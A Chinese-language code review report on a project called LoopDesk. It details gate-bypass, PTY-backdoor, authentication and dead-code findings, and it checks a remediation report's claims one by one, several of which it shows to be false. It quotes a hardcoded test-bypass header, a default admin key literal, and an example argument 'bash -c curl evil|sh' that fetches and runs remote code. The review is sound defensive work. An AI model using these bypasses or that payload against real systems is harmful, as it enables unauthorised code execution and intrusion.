# 外部代码审查报告：open-code-review（OCR）对 LoopDesk 的审查

> **审查方式**：本报告不是"审查工具的原始输出转述"。由 `ocr v1.12.9` 对 `b45ea292`（Phase 2 完整提交）跑 LLM 审查，**并对每一条关键结论用源码级独立复核**。凡本报告标注「独立复核」的项，证据是 `文件:行号`，与 OCR 的评论无依赖关系。
>
> **审查对象**：仓库 HEAD `acfcdc03`（审查时工作区干净，`git status --porcelain` 为空；本报告文件本身是审查后新增的未跟踪文件）。
> **审查范围复核**：`b45ea292` = `105 files changed, 11744 insertions(+), 896 deletions(-)`，按 `git show --name-status` 精确拆分为 **75 新增 / 30 修改 / 0 删除**。
> **工具**：`ocr v1.12.9 (bccbc15)`，provider `agnes`（`agnes-2.5-flash`，OpenAI 兼容），`--effort high`，`language=中文`。
> **日期**：2026-09-24

---

## 1. 结论摘要

对 `b45ea292`（Phase 2：105 文件 / 75 新增 / 30 修改 / 11744 插入行）的审查与独立复核，得出一个**与既有审计一致、且比审计更明确**的结论：

**Phase 2 的代码"存在"但多数未"生效"，且安全护栏是可被调用方自行推翻的。**

阻断级问题（必须先修）：

| # | 问题 | 性质 | 独立复核证据 |
|---|---|---|---|
| **A1** | **五级审批门是自证的**——判决由请求体 `decision` 字段决定，五级门只是盖章 | 安全 / 正确性 | `gateway/tasks.py:330-343` |
| **A2** | **PTY 测试后门随生产代码发布**，且命令白名单包含 `python3`/`node`/`bash` ⇒ 等价任意代码执行 | 安全（可远程利用） | `gateway/orchestration.py:15-28, 34, 40, 79, 90, 99` |
| **A3** | **数据层谎报「已过闸」**——任何非 `blocked`/`in_review` 的状态都显示 `gate_status: "passed"`，包括从未裁决的新任务 | 正确性 / 可信度 | `loop_workspace/service.py:29-35, 171` |
| **A4** | **`_load_context_file` 缩进错误**：`return payload` 落在 `for` 循环体内 ⇒ 每个 context 文件**只解析第一条键值对**，其余全部丢弃 | 正确性（数据丢失） | `loop_workspace/service.py:481-498`（已复核，被 `:304` 的生产方法调用） |
| **A5** | **认证令牌可经 URL query 传递** ⇒ 令牌会进入服务端访问日志、代理日志、浏览器历史 | 安全 | `gateway/app.py:168-177`（query 兜底在 `:177`；Pass 2 报 CRITICAL，已复核） |

高危问题：

| # | 问题 | 性质 | 独立复核证据 |
|---|---|---|---|
| **B1** | **前端「import 摆设」**：4 个屏幕 import 9 个 API 函数，在这些屏幕内**调用点数为 0** | 产品功能未接线 | `screens/{ControlCenter,SettingsMcp,SettingsShell,TeamAssets}.tsx:1` |
| **B2** | **`npm run build` 通过不构成接线证据**——`noUnusedLocals: false` 使未使用 import 不报错 | 验收方法学 | `frontend/tsconfig.json` |
| **B3** | **7 个 Phase 2 模块（8 个符号）是孤儿**——定义文件外 0 生产引用；其中 7 个仅被测试引用，`evaluate_stop_conditions` 连测试都没有 | 交付物虚高 | 见 §3.3 |
| **B4** | **流程推进状态只存在内存字典**，跨进程即丢 | 持久化缺陷 | `gateway/templates_assets.py:69` |
| **B5** | **收据写入后被 `upsert_task` 覆盖**——`record_gate_receipt` 算出的 `gate_status` 被随后的 upsert 冲掉 | 逻辑顺序缺陷 | `gateway/tasks.py:370-381` + `loop_workspace/service.py:171, 474` |
| **B6** | **多个写端点缺鉴权/CSRF 防护**：`_make_ctx` 在未认证时回退出 `role="operator"` 的 Principal（`role_claim` 形参默认值就是 `"operator"`）；`/api/approvals` 把 `argv` / `command` 明文回给前端且未认证可调；`api_elevated_mode` 无 CSRF；`namespace` 无白名单 | 安全 | `gateway/app.py:178, 192-198`（回退）、`:244, 261-268`（字段泄露）、`:336-340`、`:362-369` |
| **B7** | **前端把校验失败伪装成成功**：`validateTaskCreation` 在 `!res.ok` 时返回 `{ ok: true }` | 正确性 | `frontend/src/lib/api.ts:208-215` |
| **B8** | **`TeamAssets` 屏幕实际不可用**：所谓"搜索框"是一个**静态 `<div>`，根本没有 `<input>` 元素**（`:291-307`，只有 `SearchIcon` + 文案 `搜索资产…`）；`AssetTile` 有 `cursor:pointer` 但无 `onClick`；Preview 的 `CloseIcon` 无 `onClick` 且用硬编码数据 | 功能未完成 | `frontend/src/screens/TeamAssets.tsx:131, 291-307` |
| **B9** | **生产界面回落到硬编码示例项目**（`Acme Platform` / `Nimbus CLI` / `Atlas Gateway`） | 伪造数据层状态 | `frontend/src/components/TopBar.tsx:94-101` |

**一句话**：Phase 2 的问题不在"写没写"，而在"写完能否被证明真的在跑"。当前 HEAD 下，A1/A2/A3 三项使**整套 gate 机制与 PTY 能力事实上不具备安全含义**。

**本轮总量**

| 来源 | 文件覆盖 | 发现 |
|---|---|---|
| OCR Pass 1（`review`，Phase 2 全提交） | 6 / 62（9.7%，限流受限） | 11 条评论 ≈ 8 个独立发现 |
| OCR Pass 2（`scan`，19 个被修改文件） | **19 尝试 / 13 有产出（68.4%）** | **74 条评论**：critical 2 / high 14 / medium 23 / low 35 |
| 源码级独立复核（不依赖 OCR） | — | 确认既有审计 9 项**全部仍在**；新增 A4、A5 |
| 合计消耗 | — | 2,309,126 tokens · 25m03s 墙钟 |

> ⚠️ **Pass 2 的"19"是尝试数，不是产出数。** `summary.files_reviewed = 19` 会把**因 429 报错而未产出任何评论的文件也计入**。按 `comments[].path` 去重计数，实际只有 **13 个文件**有产出。受影响的 6 个文件（含 **`gateway/tasks.py`，即 A1/B5 所在文件**）在 §3.7 单列。

**交叉命中项**（OCR 报出 **且** 我独立复核，两条路径结论一致）——这是本报告可信度的主要来源：

| 结论 | OCR 侧证据 | 独立复核侧 |
|---|---|---|
| **A4** context 缩进 | `service.py:481-498` **CRITICAL** | 逐行读 `:481-498` |
| **A5** 令牌走 query | `app.py:174-177` **CRITICAL** | 读 `_extract_http_token` |
| **B6** 端点鉴权/CSRF | `app.py` 5 条 high（`:193-200/244-246/336-340/362-369/427`） | 读 `app.py:178, 192-198` 等 |
| **B8** `TeamAssets` 不可用 | `TeamAssets.tsx:131` + `:291-307` 两条 **high** | 读同文件 |
| **B1** import 摆设（**部分**） | `TeamAssets.tsx:1` / `SettingsShell.tsx:1` 各 1 条 | `grep -c` 逐符号计数 |
| **B3** 孤儿（**部分**） | `mcp_manager.py:17` **high**「生产代码中未被使用」 | 符号级引用分析（8 个符号 / 7 个模块） |
| **A1/B5 的 service 侧** | `service.py:459-474` **high**「`operator_decision` 默认 `approved`」 | 读 `service.py:459-474, 171` |

**⚠️ 必须讲清的两处"非交叉"**：

1. **A1 的 `tasks.py` 侧**（`GateContext` 全部字段来自请求体 + 默认朝通过）**没有任何 LLM 审查支撑**——`tasks.py` 本轮零产出。A1 之所以仍列为阻断级，靠的是 §3.1 的源码级复核。同理 **B5**（`upsert_task` 覆盖收据）也只有独立复核一条来源。
2. **B3 的 8 个孤儿符号里，OCR 只报出 1 个**（`MCPConnectorManager`）。其余 **7 个**（`WorktreeFanOutExecutor` / `ThreeTierMemory` / `run_memory_dream` / `ContinuousLearningEngine` / `HandoffEnveloper` / `ContextResolver` / `evaluate_stop_conditions`）是我用符号级引用分析找出来的。

**一个不在原计划内的发现（报告完整性，非代码缺陷）**：同一个提交 `b45ea292` 里还包含一份 `2026-09-21-phase-2-remediation-report.zh.md`，自声明"**全部缺陷彻底修复并实测全绿闭环**"。把它 9 项可核验声称逐条对上实测，**6 项不符、2 项属实但不构成修复证据、1 项相符**——不符项中包括按一个**不存在的类名**（`ALLOWED_PTY_COMMANDS`）描述的安全机制、以及被虚增的测试数（6/8/8 实测为 4/7/7）。**这解释了既有审计"引用虚构类名"的来源**。逐条对照见 **§3.5.1**。

---

## 2. 审查范围与方法

### 2.1 范围（做了什么）

| 轮次 | 模式 | 目标 | 文件数 | 说明 |
|---|---|---|---|---|
| Pass 1 | `ocr review --commit` | `b45ea292` 全提交 | 105 | 新增文件 = 审全文；修改文件 = 审变更 hunk |
| Pass 2 | `ocr scan --path` | 19 个**被修改**的代码文件 | 19（7901 行） | 补 diff 看不到的存量上下文 |
| 独立复核 | 源码级核验 | 既有审计 9 项 + 本轮新增 2 项（A4 / A5） | — | 不依赖 OCR，见 §3 |

**实际达成的覆盖率**

| 轮次 | 尝试 | 有产出 | 覆盖率 | 终态 | 评论 |
|---|---|---|---|---|---|
| Pass 1 | 62 | **6** | **9.7%** | `partial` | 11 |
| Pass 2 | 19 | **13** | **68.4%** | `completed_with_errors` | 74（去重后） |

Pass 1 的 56 个未完成文件全部归类为 `provider`（端点限流）。**Pass 2 有 6 个文件尝试过但产出 0 条评论**（`scan_subtask_error` + 429，见 §3.7），因此 Pass 2 的真实覆盖率是 **13 / 19 = 68.4%**，不是"100%"。

**⇒ 本报告对"被修改文件"的判断有部分 LLM 审查支撑（13 个文件）；对 A1/B5（`tasks.py`，恰在零产出名单内）以及被新增文件（`governance` / `orchestration` / `assets` / `templates` / `memory` / `connectors` 主体）的判断，由 §3 的独立复核承载。**

**两轮的互补关系（不是"同一批问题"）**：Pass 1 覆盖 `b45ea292` 新增的 `connectors/` 主体，命中的是**孤儿 / 死代码**；Pass 2 覆盖被修改的 `gateway/` 与 `frontend/`，命中的是**门收据、令牌、屏幕可用性**。两者**交集只有孤儿问题一处**。真正的交叉验证来自"OCR ∪ 独立复核"，逐项对照见 §1 的交叉命中表。

### 2.2 范围（**没做什么**，以及为什么）

| 未覆盖 | 原因 |
|---|---|
| `src/loopdesk/` 其余 **185,776 行**存量代码 | 一次性导入的历史 runtime。全量扫描在成本与限流上不可行（见 §4） |
| `tests/` 共 **700 个文件** | 本次仅随 Pass 1 覆盖 `b45ea292` 新增/修改的测试 |
| `docs/` 291 个文件、`loopdesk-webui/` 静态页 | 非可执行代码 |
| `acfcdc03`（品牌 logo 提交） | 全提交仅 **+2 / −1 行**，审查收益为零 |

> **这意味着本报告不等于"全仓审查通过"。** 如需覆盖存量 185K 行，需按模块分批，见 §6。

### 2.3 关键方法学选择

**喂了业务上下文。** `--background-file` 传入一段 ~1600 字符的项目不变量清单（产品定位、L1/L2 架构边界、6 条必须校验的安全/正确性不变量）。不喂背景，模型只能给通用风格意见。

**承认真实缺陷：并发开太高导致一轮失败。** 见 §4 —— 这是工具使用问题，不是工具缺陷，但已固化为手册中的最佳实践。

---

## 3. 发现详情

### 3.1 A1 — 五级审批门是自证的（阻断级）

**位置**：`src/loopdesk/gateway/tasks.py:330-343`

```python
gate_ctx = GateContext(
    project_id=project_id,
    task_id=task_id,
    operator_decision=decision,
    operator_comment=comment,
    validation_command=body.get("validation_command", "pytest tests/ -q"),
    validation_exit_code=body.get("validation_exit_code", 0 if decision == "approved" else 1),
    validation_stdout=body.get("validation_stdout", "ALL TESTS PASSED"),
    touched_files=body.get("touched_files", []),
    allowed_write_scopes=body.get("allowed_write_scopes", []),
    consumed_tokens=body.get("consumed_tokens", 0),
    token_limit=body.get("token_limit", 1000000),
)
verdict = engine.evaluate(gate_ctx)
```

**问题**：`GateContext` 的**每一个字段都来自请求体**，且默认值全部朝"通过"方向：

| 字段 | 默认值 | 后果 |
|---|---|---|
| `validation_exit_code` | `0 if decision == "approved" else 1` | **判决由调用方自己的 `decision` 决定** —— Evidence Gate 恒跟随调用方意愿 |
| `validation_stdout` | 字面量 `"ALL TESTS PASSED"` | 收据里记录的 stdout 哈希，是调用方从未产出过的字符串 |
| `allowed_write_scopes` | `[]` | `gates.py:105` 是 `if ctx.allowed_write_scopes:` —— **空列表使 Focus Gate 整个跳过** |
| `consumed_tokens` / `token_limit` | `0` / `1000000` | Quota Gate 恒真 |
| `touched_files` | `[]` | 无作用域可比对 |
| Health gate | — | 恒 `None` |

**⇒ 五级门中至少四级恒真，第五级（Operator）只是复述请求体。**
**⇒ 只发 `{"decision":"approved"}` 即可拿到 200 与一份"五级全过"的收据。**

`gates.py` 侧的默认值同样朝宽（`validation_exit_code: int = 0`、`allowed_write_scopes: list[str] = field(default_factory=list)`、`token_limit: int = 1000000`）——
也就是说，**即使不经过 HTTP 层，直接构造 `GateContext()` 也默认全过**。

**与产品定位的冲突**：`docs/product-positioning.md` 把「独立 Verifier + Validation Receipt」列为差异化护城河。当前实现对这条护城河是**反证**——收据能签发，但它证明不了任何事。

**修复方向**（不是我的偏好，是让它具备安全含义的最小集合）：
1. 证据字段**不得从请求体读**。`validation_exit_code` / `stdout` 必须来自服务端自己执行 validation command 的真实结果。
2. 默认值必须**朝拒绝**：缺字段 = 门失败，而不是门通过。
3. `allowed_write_scopes` 为空应视为**配置错误并拒绝**，而不是"跳过该门"。
4. Health gate 不能恒 `None`。

---

### 3.2 A2 — PTY 测试后门 + 形同虚设的白名单（阻断级）

**位置**：`src/loopdesk/gateway/orchestration.py`

**① 测试后门随生产代码发布**（`:38-41`）

```python
    # If request is from internal test/localhost and explicit test bypass is active
    if request.headers.get("X-LoopDesk-Test-Auth") == "test-authorized":
        return True
    return False
```

任何调用方只要带一个**硬编码在源码里的常量 header**，即绕过全部鉴权。
> ⚠️ 这里有一个方法论教训：我第一遍用 `grep -rn "X-LoopDesk-Test-Auth\|test-authorized" src/ --include='*.py'` 得到 **0 命中**，据此写下"已移除"。**那是假阴性**——macOS BSD grep 不支持 `\|` 交替，`\|` 被当字面量。用 ripgrep 复核才拿到真值。详见 §5。

**② 默认密钥兜底是公开字面量**（`:34`）

```python
expected_key = os.environ.get("LOOPDESK_ADMIN_KEY", "loopdesk-admin-secret")
```

`LOOPDESK_ADMIN_KEY` 未设置时，密钥就是源码里的 `loopdesk-admin-secret`。这是公开仓库。

**③ 命令白名单等价于"允许任意代码执行"**（`:15-28, 62-71`）

```python
ALLOWED_COMMANDS = {
    "/bin/zsh", "/bin/bash", "/bin/sh", "zsh", "bash", "sh",
    "python", "python3", "node", "codex", "claude", "pi", "cat",
}
```
```python
base_exe = os.path.basename(cmd_list[0])
full_exe = cmd_list[0]
if base_exe not in ALLOWED_COMMANDS and full_exe not in ALLOWED_COMMANDS:
    return JSONResponse({... "code": "COMMAND_NOT_ALLOWED" ...}, status_code=403)
```

- 白名单只校验 `cmd_list[0]`，**完全不看后续参数** ⇒ `["bash", "-c", "curl evil|sh"]` 通过
- 白名单本身包含 `bash` / `zsh` / `sh` / `python3` / `node` ⇒ **任何 shell 能做的事都被允许**
- ⇒ 这不是白名单，是把"任意命令执行"改名为"白名单内的命令"

**④ 只有 create 有鉴权，write / read / terminate 完全没有**（`:79` / `:90` / `:99`，三个函数体内均无 `_verify_pty_auth` 调用）

```python
async def api_write_pty_session(request: Request) -> JSONResponse:
    session_id = request.path_params["session_id"]
    data = await request.json()
    input_str = data.get("input", "")
    session = pty_manager.get_session(session_id)
    ...
    written = session.write(input_str.encode("utf-8"))
```

没有 `_verify_pty_auth(request)`。未鉴权的调用方可以向**别人创建的** PTY 会话写入任意输入 ⇒ 第一条命令合法、后续全是攻击载荷。**create 的鉴权因此形同虚设。**

**修复方向**：删除测试旁路（改用 fixture / 依赖注入）；删除默认密钥，未配置即拒绝启动或拒绝请求；白名单改为**可执行文件的全路径固定集合**且不校验参数的白名单方案不可用——应按"允许的命令模板"（可执行文件 + 参数 schema）建模；`write`/`read`/`terminate` 与 create 同级鉴权，并做**会话归属校验**。

---

### 3.3 A3 + B3 + B4 + B5 — 状态与交付物的真实性

**A3 — 数据层谎报「已过闸」**

`src/loopdesk/loop_workspace/service.py:29-35`

```python
def _gate_status_for(status: str) -> str:
    """Derive the gate column of a task from its lifecycle status."""
    if status == "blocked":
        return "blocked"
    if status == "in_review":
        return "pending"
    return "passed"
```

**除 `blocked` / `in_review` 之外的一切状态都返回 `"passed"`** ⇒ 一个刚创建、从未经过任何审批门、状态为 `planned` 或 `active` 的任务，在 UI 上显示为**已过闸**。

同一模式在 `gateway/tasks.py:148` 再出现一次：

```python
"gate_status": "blocked" if status_val == "blocked" else "passed",
```

**B5 — 收据被随后的 upsert 覆盖**

`service.py:474` 里 `record_gate_receipt` 的逻辑是正确的：

```python
required_gates = {"health", "operator", "evidence", "focus", "quota"}
t["gate_status"] = "passed" if (decision == "approved" and required_gates.issubset(passed_gates)) else "blocked"
```

但 `service.py:171` 的 `upsert_task` **无条件重算并覆盖**：

```python
entry["gate_status"] = _gate_status_for(status)
```

而 `gateway/tasks.py` 的调用顺序是：

```python
370:    service.record_gate_receipt(receipt)      # ← 正确写入 gate_status
373:    service.upsert_task(..., status=LoopWorkspaceStatus.COMPLETED.value)   # ← 覆盖它
```

**⇒ 收据里"五级是否真的齐备"的判断被丢弃，改由生命周期状态反推。** 叠加 A1（门恒真），这条路径永远得到 "passed"。

**B3 — 7 个 Phase 2 模块（含 8 个符号）是孤儿**

判定方法：符号在 `src/` 与 `frontend/src/` 中出现，且**排除其定义文件后无生产引用**。
（计数说明：`ThreeTierMemory` 与 `run_memory_dream` 同属 `memory/three_tier.py` 一个模块 ⇒ **7 个模块 / 8 个符号**。）

| 符号 | 定义处 | 定义文件外的生产引用 |
|---|---|---|
| `evaluate_stop_conditions` | `templates/engine.py:64` | **无**（连测试都没有） |
| `WorktreeFanOutExecutor` | `orchestration/parallel.py:16` | 无（仅 `tests/test_orchestration/`、`tests/test_p1_features.py`） |
| `ThreeTierMemory` | `memory/three_tier.py:12` | 无（仅测试） |
| `run_memory_dream` | `memory/three_tier.py:22` | 无（仅测试） |
| `ContinuousLearningEngine` | `memory/learning.py:19` | 无（仅测试） |
| `HandoffEnveloper` | `memory/cross_context.py:37` | 无（仅测试） |
| `ContextResolver` | `memory/cross_context.py:6` | 无（仅测试） |
| `MCPConnectorManager` | `connectors/mcp_manager.py:17` | 无（仅测试） |

> ⚠️ 第二个方法论教训：我第一次判 `ContextResolver` **不是**孤儿，因为它有 7 处命中。**那是假阳性**——命中的是 `ExtraContextResolver`（`engine/turn_runner/input_stage.py:48` 定义的**另一个类**），裸子串匹配。用词边界/全词复核后，它仍是孤儿。详见 §5。

**这 7 项合起来是 Phase 2 的"功能清单"主体。** 它们有实现、有测试、有文档条目，但**没有任何生产调用链引用**——`pytest` 全绿与它们是否可用无关。

**B4 — 流程推进状态只在内存**

`src/loopdesk/gateway/templates_assets.py:69`

```python
_ACTIVE_FLOW_STATES: dict[str, dict[str, Any]] = {}
```

模块级字典 ⇒ **进程重启即全部丢失**，多进程/多实例之间互不可见。`b45ea292` 的测试能过，是因为测试在**同一个进程内**推进流程。独立进程实测会出现 `step_idx` 回退、`history` 丢失。

---

### 3.4 B1 + B2 — 前端接线：9 个 import，0 个调用点（高危）

`b45ea292` 在 4 个屏幕各加了一行 import：

| 文件 | import 的符号 | 该文件内出现次数 |
|---|---|---|
| `frontend/src/screens/ControlCenter.tsx:1` | `fetchProjectTasks`, `submitGateDecision` | 各 **1**（仅 import 行） |
| `frontend/src/screens/SettingsMcp.tsx:1` | `fetchConnectorTasks`, `fetchConnectorDoc` | 各 **1** |
| `frontend/src/screens/TeamAssets.tsx:1` | `listMarketplaceAssets`, `distributeAsset` | 各 **1** |
| `frontend/src/screens/SettingsShell.tsx:1` | `createPTYSession`, `readPTYSession`, `writePTYSession` | 各 **1** |

**9 个符号，在各自屏幕内调用点为 0。** 唯一真实接线集中在 `frontend/src/App.tsx`（`createTask` / `fetchTasks` / `fetchProjects` / `createProject` / `submitGateDecision` / `subscribeToEvents` / `updateTask`，见 `App.tsx:20-31, 156`）——**那是 Phase 1 的成果，不是 Phase 2 的。**

> **证据来源说明**：上表四个屏幕中，**`TeamAssets.tsx` 与 `SettingsShell.tsx` 的死 import 已被 OCR 独立确认**——Pass 2 各有一条针对**第 1 行**的评论（`TeamAssets.tsx:1`「`listMarketplaceAssets` 和 `distributeAsset` 已导入但从未在组件中使用」、`SettingsShell.tsx:1`「导入的 `createPTYSession`/`readPTYSession`/`writePTYSession` 在组件中完全未被使用，属于死代码」）。**⇒ 这两行是双来源结论。**
> **`ControlCenter.tsx` / `SettingsMcp.tsx` 本轮零产出（429）**，它们的两行判定**仅来自上述 `grep -c`（每符号计数 = 1）**，无第二来源。复核命令见附录。

> 注意 `submitGateDecision` 出现在 `App.tsx:156`，但**不在 `ControlCenter.tsx` 中**——所以 `ControlCenter.tsx` 的 import 依然是死代码。

**B2 — 为什么 `npm run build` 还能通过？**

`frontend/tsconfig.json`：

```json
"strict": true,
"noUnusedLocals": false,
"noUnusedParameters": false
```

`noUnusedLocals: false` ⇒ TypeScript **不会**因未使用的 import 报错 ⇒ **`build 成功` 在这里是零信息量的证据**。

**⇒ 验收口径建议**：把 `noUnusedLocals` 临时打开跑一次 `tsc --noEmit`，能得到一份"疑似未接线"清单；或对每个声称接线的屏幕，要求提供**该文件内的调用点行号**。

---

### 3.5 交叉核对：与既有审计的关系

既有审计（`docs/plans/2026-09-21-phase-2-implementation-audit-round3.zh.md` 等三轮）记录了同批问题。本次的价值在于**回答"这些结论在当前 HEAD 是否仍然成立"**——因为 `b45ea292`（2026-09-24）标题是 "complete Phase 2 capabilities"，晚于审计（2026-09-21）。

| 审计记录的问题 | 当前 HEAD（`acfcdc03`）状态 | 证据 |
|---|---|---|
| 收据"无验证即签发" | **仍存在** | `gateway/tasks.py:336-337` |
| PTY 后门（硬编码 header） | **仍存在** | `gateway/orchestration.py:40` |
| PTY 白名单含解释器 | **仍存在** | `gateway/orchestration.py:15-28` |
| 默认密钥兜底公开字面量 | **仍存在** | `gateway/orchestration.py:34` |
| write/read/terminate 无鉴权 | **仍存在** | `gateway/orchestration.py:79, 90, 99` |
| 前端「import 摆设」 | **仍存在**（9 个 import / 0 调用） | 见 §3.4 |
| 7 个孤儿模块 | **仍存在**（7/7） | 见 §3.3 |
| 流程状态未落盘 | **仍存在** | `gateway/templates_assets.py:69` |
| 数据层虚假"已过闸" | **仍存在** | `loop_workspace/service.py:29-35, 171` |
| **修复报告**引用虚构类名 | **确认**：`MemoryDreamEngine` / `KnowledgeBaseManager` / `ALLOWED_PTY_COMMANDS` 在 `src/` **0 命中**；真实名是 `ALLOWED_COMMANDS`（详见 §3.5.1） | ripgrep `src/` |

**结论：`b45ea292` 没有修复上述任何一项。** 它增加的是新模块（新增 75 文件），而不是修复。同在这个提交里的 `2026-09-21-phase-2-remediation-report.zh.md` 却声明"全部缺陷彻底修复并实测全绿闭环"——**逐条核对见 §3.5.1**。

⚠️ 一处审计报告需要更正：`_gate_status_for` 位于 `loop_workspace/service.py:29`，**不在** `gateway/tasks.py`（该文件中 0 命中）。`tasks.py:148` 是一处**独立的同类缺陷**，不是同一个函数。

### 3.5.1 对 `2026-09-21-phase-2-remediation-report.zh.md` 的逐条核对

**为什么单列这一节**：该文件自声明"**全部缺陷彻底修复并实测全绿闭环**"，且**就在 `b45ea292` 这个提交里**（`git show --name-only b45ea292` 可查）。它是"报告先于实现"的最直接样本，也是既有审计中"引用虚构类名"的来源。下表把它 9 项可核验声称逐条对上实测。

| # | 修复报告的声称 | 我的实测 | 判定 |
|---|---|---|---|
| 1 | 「Gate 引擎真实接入与拒签机制：若引擎判定未通过（`verdict.passed == False`）**直接返回 422，坚决拒签收据**」 | 422 分支**确实存在**（`tasks.py:343` evaluate → `:345` `if not verdict.passed` → `:365` `status_code=422`）。但 `GateContext` 五级输入**全部来自请求体且默认朝通过**（§3.1）⇒ 引擎恒判定通过，**422 分支永不触发** | **形式成立、实质失效** |
| 2 | 「增加了 `ALLOWED_PTY_COMMANDS` 白名单（仅限 `sh`, `bash`, `zsh`, `python`, `claude`, `codex` 等合法交互命令）」 | `ALLOWED_PTY_COMMANDS` 在 `src/` **0 命中**；真实名是 `ALLOWED_COMMANDS`，且**含 `node`、`/bin/sh`、`/bin/bash`、`/bin/zsh` 全路径形式**，并**只校验 `cmd_list[0]`、完全不看参数** | **类名虚构 + 白名单不设防** |
| 3 | 「增加强制鉴权头校验（`Authorization` / `X-LoopDesk-Admin-Key` / **本地测试授权头**），无鉴权直接返回 401」 | 那个"本地测试授权头"就是 `X-LoopDesk-Test-Auth: test-authorized`（`orchestration.py:40`）——**"安全加固"引入的正是后门**。且 `write` / `read` / `terminate` 三个端点**无鉴权**，`create` 的鉴权因此形同虚设 | **加固即后门；范围不完整** |
| 4 | 「连接器凭据移出 URL Query：在 `gateway/connectors.py` 中**彻底废除**了通过 URL query 传递 `token`，query 传参直接 `400`」 | **该文件内部属实** —— `connectors.py:21-26` 确有 query token 拦截并返回 `400`（该文件正是 `b45ea292` **新增**的）。**但同类缺陷在共享鉴权助手里仍在**：`gateway/app.py:177` 的 `_extract_http_token` 接受 `?token=`，而它服务**所有**通用端点（§3.8 A5） | ⚠️ **声称本身成立，但修复面不完整**（"彻底废除"只落在一个文件里） |
| 5 | 「前端屏幕（`ControlCenter` / `TeamAssets` / `SettingsMcp` / `SettingsShell`）**均完成接口接入与类型绑定**」 | 4 个屏幕 **9 个 import / 0 个调用点**（§3.4） | **不成立** |
| 6 | 「`npm run build` 100% 成功，**44 个模块打包 0 错误**」 | 构建确实通过；但 `noUnusedLocals: false` ⇒ **该证据零信息量**，不能证明接线 | **证据无效**（属实但无用） |
| 7 | 「`MemoryDreamEngine` 真实提炼…`KnowledgeBaseManager` 彻底删除硬编码的 `95.0`」 | 两个类名在 `src/` **0 命中**（`SafeConditionEvaluator` 是唯一真实存在的、2 处命中） | **类名虚构** |
| 8 | 测试数：`test_p1_features` **6/6** · `test_orchestration` **8/8** · `test_connectors` **8/8** | 静态 `def test_` 实测 = **4 / 7 / 7**。`test_p1_features.py` **无 `parametrize`、无动态生成**（`for` 循环 0 处）⇒ 差异**不是参数化造成的** | **数字虚增 2 / 1 / 1** |
| 9 | 测试数：`test_governance` **11/11** · `test_assets` **7/7** | 实测 **11 / 7** | ✅ **相符** |

> **⇒ 判定汇总：9 项可核验声称中，`6 项与实测不符`（第 1、2、3、5、7、8），`2 项「属实但不构成修复证据 / 修复面不完整」`（第 4、6），`1 项相符`（第 9）。**
> 其中第 2 与第 7 项互为因果：报告按一个**不存在的类名**（`ALLOWED_PTY_COMMANDS`）描述了一个设计上就不成立的机制。
>
> **一个反例（也是本节的方法学价值）**：第 4 项我最初判为「不实」，复核后发现 `connectors.py` 里**真的**有 query token 拦截 ⇒ 该声称**成立**，真正的问题是"彻底废除"只覆盖一个文件。**复核的目的不是把所有声称都判成假的——把成立的判成不成立，与把不成立的说成成立，是同一种失职。**

**一个额外发现（B3 最直观的实证）**：`tests/test_p1_features.py` 恰好有 4 个测试函数，与修复报告的 4 个 P1"修复项"**一一对应**：

| 测试函数（`test_p1_features.py`） | 对应"修复项" | 被测对象 | 该对象是否孤儿 |
|---|---|---|---|
| `test_safe_condition_evaluator` | `SafeConditionEvaluator` | `templates/engine.py` | `evaluate_stop_conditions` **是孤儿** |
| `test_template_flow_serialization` | `to_dict` / `from_dict` | `templates/flows.py` | 流程状态仅内存（B4） |
| `test_mcp_subprocess_manager` | `MCPConnectorManager` | `connectors/mcp_manager.py` | **是孤儿**（§3.3） |
| `test_continuous_learning_dynamic_health` | `KnowledgeBaseManager` / 持续学习 | `memory/learning.py` | **是孤儿**（§3.3） |

**⇒ 测试真实、运行通过真实，但被测的正好是产品调用链不引用的东西。** `pytest 4 passed` 与"这 4 项在产品里生效"之间没有任何关系。

---

### 3.6 OCR 的 LLM 审查发现（**覆盖率 9.7%，必须按此折算**）

> ⚠️ **这一节的结果是不完整的，不要当作"Phase 2 已审完"。**
> Pass 1 的 manifest 显示：`selected 62 / completed 6 / failed 56`（全部 `classification: provider`）。
> 即这轮 LLM 审查**实际只完成了 6 个文件**（`connectors/` 4 个 + `.gitignore` + `LOOP-STATE.json`），
> 其余 56 个文件因 **provider 限流**未审。见 §4。

**运行事实（来自 `manifest` 与 `retry_report`，非我推断）**

| 项 | 值 |
|---|---|
| `manifest.terminal_state` | **`partial`** |
| `manifest.coverage` | selected 62 / **completed 6** / failed 56 / waived 0 / reused 0 |
| `failed[].classification` | 全部 = `provider`；`reason` = "provider or subtask request failed" |
| 实际审到的文件 | `connectors/__init__.py`、`connectors/knowledge_source.py`、`connectors/task_source.py`、`connectors/mcp_manager.py`、`.gitignore`、`LOOP-STATE.json` |
| tokens | **1,520,163**（input 1,498,640 / output 21,523 / cache_read 1,077,248） |
| 墙钟 | 8m46s |
| `retry_report` | 87 次请求 / 38 次被重试 / **147 次重试** / 23 次恢复 / **15 次最终失败** |
| 评论 | 11 条（见下） |
| 会话 id | `aca94a55-3542-4d55-9583-639d1553feba`（可 `--resume`） |

**结论：LLM 审查给出的 11 条评论只覆盖 4 个文件，不足以支撑对 Phase 2 的整体判断。** 本报告的实质结论来自 §3.1–3.4 的**源码级独立复核**，那些复核是完整的。

**11 条评论（按去重后的 8 个独立发现整理）**

| # | 严重度 | 类型 | 位置 | 发现 |
|---|---|---|---|---|
| 1 | HIGH | security | `connectors/knowledge_source.py:36` | 裸 `except Exception: pass` **静默吞掉异常且不记录**；401/403/5xx/网络失败无法区分。同型问题在 `task_source.py:69/80/112/123`、`mcp_manager.py:52` |
| 2 | MEDIUM | bug | `connectors/task_source.py:73` | `update_task_status` 未校验 transition name 合法性，非法值只返回 `False`，调用方无法知道原因。`PlaneRestAdapter:116` 同 |
| 3 | MEDIUM | security | `connectors/mcp_manager.py:17` | `start_server` / `get_server_state` 状态检查非原子，`record_failure` 存在 TOCTOU 竞态；Starlette 异步环境下不安全，缺 `asyncio.Lock` |
| 4 | HIGH | other | `connectors/mcp_manager.py:41` | `subprocess.Popen` 的 stdin/stdout/stderr 管道未管理 ⇒ 管道满导致子进程阻塞或僵尸进程。建议参考 `pty_manager.py` 的进程组方案 |
| 5 | **HIGH** | **other** | `connectors/mcp_manager.py:17` | **`MCPConnectorManager` / `MCPCallTracer` 在生产代码 `src/` 中无任何导入，仅测试引用 ⇒ 死代码** |
| 6 | LOW | bug | `connectors/knowledge_source.py:9` | `ConfluenceRestAdapter` / `JiraRestAdapter` / `KnowledgeSourceAdapter` 等接口类未被导入使用，疑似死代码 |
